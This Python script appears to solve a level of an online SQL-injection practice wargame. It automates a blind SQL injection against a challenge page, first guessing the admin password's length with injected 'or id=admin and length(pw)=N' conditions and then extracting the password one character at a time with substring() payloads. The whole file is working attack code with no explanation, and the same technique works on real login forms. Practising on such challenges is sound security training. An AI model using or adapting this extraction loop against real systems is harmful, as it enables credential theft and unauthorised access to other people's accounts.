import requests
import urllib.parse
import string

cookies={'PHPSESSID': 'cookie_value'}

hello_admin="Hello admin"
length_pass=0
for x in range(10):
        url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="+ urllib.parse.quote("' or id='admin' and length(pw)={}#".format(x))
        print(url)
        res = requests.get(url,cookies=cookies)
        #print(res.text)
        if hello_admin in res.text:
                print("Password Lenght is "+str(x))
                length_pass=x
print(length_pass)







pwd = ''


for i in range(1, length_pass+1):
        for j in range(48, 122):
                url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and "+ urllib.parse.quote("substring(pw,{},1) = '{}".format(str(i),chr(j))) #substring(pw,1,1)=0
                print(url)
                req = requests.get(url, cookies=cookies)
                #print(pwd)
                if "Hello admin" in req.text:
                        print(pwd)
                        pwd += chr(j)
                        break

print(pwd)
